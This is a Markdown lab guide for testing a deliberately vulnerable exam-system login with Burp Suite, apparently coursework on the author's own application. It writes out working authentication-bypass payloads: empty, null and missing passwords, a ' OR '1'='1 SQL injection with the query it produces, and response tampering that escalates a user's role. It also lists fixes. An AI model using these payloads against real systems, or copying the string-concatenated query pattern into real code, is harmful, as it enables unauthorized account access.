# Parameter Manipulation Attack Testing - OES Login

## 🎯 Vulnerability Overview

Your **OES Backend Login** has been intentionally made **vulnerable** for cybersecurity lab testing.

### Vulnerabilities Introduced:

1. **No Password Validation** - Empty passwords accepted
2. **SQL Injection Vulnerable** - String concatenation instead of parameterized queries
3. **No Input Sanitization** - Special characters not escaped
4. **Parameter Manipulation** - Attacker can modify request parameters

---

## 📋 Test Setup Checklist

- [ ] Burp Suite running
- [ ] Browser proxy configured to `127.0.0.1:8080`
- [ ] Burp Intercept is **ON**
- [ ] Backend is running at `https://oes.freshmilkstraightfromsource.com`
- [ ] Frontend at `https://oes-frontend-drab.vercel.app`
- [ ] Database is seeded with test users

---

## 🔧 Test Case 1: Empty Password Bypass

### Goal
Demonstrate that empty passwords are accepted by the vulnerable backend.

### Steps

**Step 1: Navigate to Login**
```
https://oes-frontend-drab.vercel.app
```

**Step 2: Enter Credentials**
- Username: `student1`
- Password: `anypassword` (doesn't matter)

**Step 3: Enable Burp Intercept**
- Burp Suite → Proxy → Intercept
- Turn **Intercept ON**

**Step 4: Click Login**
- Burp will capture the request

**Step 5: Modify Request**

Original:
```json
{
  "username": "student1",
  "password": "anypassword"
}
```

Modified (Attack):
```json
{
  "username": "student1",
  "password": ""
}
```

**Step 6: Forward Request**
- Click "Forward" in Burp

**Step 7: Observe Response**

Expected Vulnerable Response:
```json
{
  "message": "Login successful",
  "user": {
    "id": 1,
    "username": "student1",
    "role": "student",
    "email": "student1@example.com"
  }
}
```

### ✅ Result
- If login succeeds with empty password → **VULNERABILITY CONFIRMED**
- Backend accepts empty password in SQL query

---

## 🔧 Test Case 2: SQL Injection Attack

### Goal
Demonstrate SQL injection through parameter manipulation.

### Steps

**Step 1: Intercept Login Request** (same as Test Case 1)

**Step 2: Modify Request - SQLi Payload 1**

Original:
```json
{
  "username": "student1",
  "password": "student123"
}
```

Attack - Always True Condition:
```json
{
  "username": "admin' OR '1'='1",
  "password": "' OR '1'='1"
}
```

This creates SQL query:
```sql
SELECT id, username, role, email FROM users 
WHERE username = 'admin' OR '1'='1' 
AND password = '' OR '1'='1' 
LIMIT 1
```

Since `'1'='1'` is always TRUE, authentication is bypassed!

**Step 3: Forward Request**

**Step 4: Observe Response**

Expected if vulnerable:
```json
{
  "message": "Login successful",
  "user": {
    "id": 5,
    "username": "admin",
    "role": "admin",
    "email": "admin@example.com"
  }
}
```

### ✅ Result
- If you login as **ADMIN** without correct password → **SQL INJECTION CONFIRMED**

---

## 🔧 Test Case 3: Privilege Escalation via Parameter Manipulation

### Goal
Login as student, then modify role parameter to admin in request.

### Steps

**Step 1: Intercept Student Login**
```json
{
  "username": "student1",
  "password": "student123"
}
```

**Step 2: Observe Response**

Original response:
```json
{
  "message": "Login successful",
  "user": {
    "id": 1,
    "username": "student1",
    "role": "student",
    "email": "student1@example.com"
  }
}
```

**Step 3: Analysis**
- Frontend uses this response to determine user role
- If we can intercept response, we can modify the role

### ✅ Attack Approach
- Modify response in Burp before it reaches frontend
- Change `"role": "student"` to `"role": "admin"`
- Frontend will display admin dashboard

---

## 🔧 Test Case 4: Authentication Bypass with NULL Password

### Goal
Demonstrate that missing/null password parameters bypass validation.

### Steps

**Step 1: Create Attack Payload - Option A (Explicit NULL)**

```json
{
  "username": "student1",
  "password": null
}
```

**Step 2: Create Attack Payload - Option B (Missing Field)**

```json
{
  "username": "student1"
}
```

**Step 3: Create Attack Payload - Option C (Empty String)**

```json
{
  "username": "student1",
  "password": ""
}
```

**Step 4: Intercept Login and Modify**

Original:
```json
{
  "username": "student1",
  "password": "student123"
}
```

Attack (Option A):
```json
{
  "username": "student1",
  "password": null
}
```

**Step 5: Forward Request in Burp**

**Step 6: Observe Response**

Expected vulnerable response:
```json
{
  "message": "Login successful",
  "user": {
    "id": 1,
    "username": "student1",
    "role": "student",
    "email": "student1@example.com"
  }
}
```

### ✅ Expected Result
- Login succeeds with NULL or missing password → **VULNERABILITY CONFIRMED**
- Backend accepts any password value (including null/undefined)

---

## 📊 Test Results Table

| Test Case | Attack Method | Expected Result | Status |
|-----------|---------------|-----------------|--------|
| Empty Password | `"password": ""` | Login Success | 🔴 Vulnerable |
| SQL Injection | `OR '1'='1'` | Admin Access | 🔴 Vulnerable |
| NULL Password | `"password": null` | Login Success | 🔴 Vulnerable |
| Response Modification | Burp Response Edit | Role Changed | 🔴 Vulnerable |

---

## 🔍 Debug Information

When you make login requests, check backend console output:

```
[DEBUG - VULNERABLE] Executing query: SELECT id, username, role, email FROM users WHERE username = 'student1' AND password = 'student123' LIMIT 1
```

This shows the vulnerable SQL query being constructed!

---

## 📝 Lab Report Template

### Experiment: Parameter Manipulation & SQL Injection on OES Login

**Objective:**
Test for parameter manipulation and SQL injection vulnerabilities in login authentication.

**Methodology:**
1. Set up Burp Suite as proxy
2. Intercept login HTTP requests
3. Modify parameters before reaching server
4. Analyze server responses

**Tools Used:**
- Burp Suite Community Edition
- Firefox Browser with FoxyProxy
- OES Test Application

**Vulnerabilities Found:**

| # | Vulnerability | Severity | Proof | Impact |
|---|---|---|---|---|
| 1 | Empty Password Accepted | **CRITICAL** | Empty string bypasses auth | Unauthorized access |
| 2 | SQL Injection | **CRITICAL** | `OR '1'='1'` bypasses login | Complete auth bypass |
| 3 | No Input Validation | **HIGH** | Special chars not escaped | SQL injection possible |
| 4 | Plaintext Password | **HIGH** | Visible in request body | Password exposure |

**Conclusions:**
- Backend uses vulnerable string concatenation SQL queries
- No input sanitization or validation
- Authentication can be bypassed with simple payloads
- Urgent fixes required before production deployment

**Recommended Fixes:**
1. Use parameterized queries (prepared statements)
2. Validate all inputs
3. Implement password hashing
4. Add rate limiting
5. Use HTTPS only

---

## 🛠️ Burp Suite Settings for This Test

### Intercept Scope

Go to **Proxy → Settings → Intercept Client Requests**

Add Rule:
```
URL Regex: /api/login
```

This only intercepts login requests, not all traffic.

### Response Interception

Enable **Proxy → Options → Intercept Server Responses**

This lets you modify server responses too!

---

## 💡 Tips for Testing

1. **Save Requests**: Right-click → "Send to Repeater" to save requests
2. **Compare Responses**: Use Repeater to see difference between payloads
3. **Burp Compare**: Select 2 requests, compare differences side-by-side
4. **Timing**: Watch timing differences between successful and failed logins
5. **Database Error Messages**: Some SQL errors reveal database structure

---

## ⚠️ WARNING

**This is intentionally vulnerable for educational purposes ONLY!**

Features like SQL injection and missing validation are **deliberately introduced** to demonstrate security flaws.

**NEVER deploy this to production without fixes!**

---

## Next Phase: Security Fixes

After testing, we will:
1. Implement parameterized queries
2. Add input validation
3. Hash passwords with bcryptjs
4. Implement rate limiting
5. Add CSRF protection
6. Implement proper session management

---

## Quick Command Reference

**Restart Backend After Code Changes:**
```bash
cd /home/praveen/Desktop/projects/cyberproject/backend
npm start
```

**View Debug Output:**
```bash
# Check console for [DEBUG - VULNERABLE] messages
```

**Database Reset:**
Go to phpMyAdmin and run seed.sql to reset test user passwords

---

## Testing Timeline

Estimated time: **30-45 minutes**

- Setup: 5 min
- Test Case 1: 5 min
- Test Case 2: 10 min
- Test Case 3: 5 min
- Test Case 4: 5 min
- Analysis & Screenshots: 10 min
- Report Writing: 10 min

